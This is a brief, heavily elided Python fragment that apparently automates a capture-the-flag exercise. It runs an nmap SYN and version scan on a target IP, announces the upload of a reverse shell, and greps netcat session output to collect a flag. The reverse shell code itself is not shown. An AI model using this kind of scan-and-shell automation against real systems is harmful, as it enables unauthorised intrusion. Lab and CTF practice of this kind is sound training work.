...
def get_Flags():
    ...
    nmap_command = f"sudo nmap -sS -sV {ipaddress} >{output_txt}"
    ...
    print("The reverse shell file is uploading...")
    ...
    get_flag_7 = f"echo flag_7 = $(grep /usr/bin/python {nc_result_txt} | uniq)>>{flags_txt}"
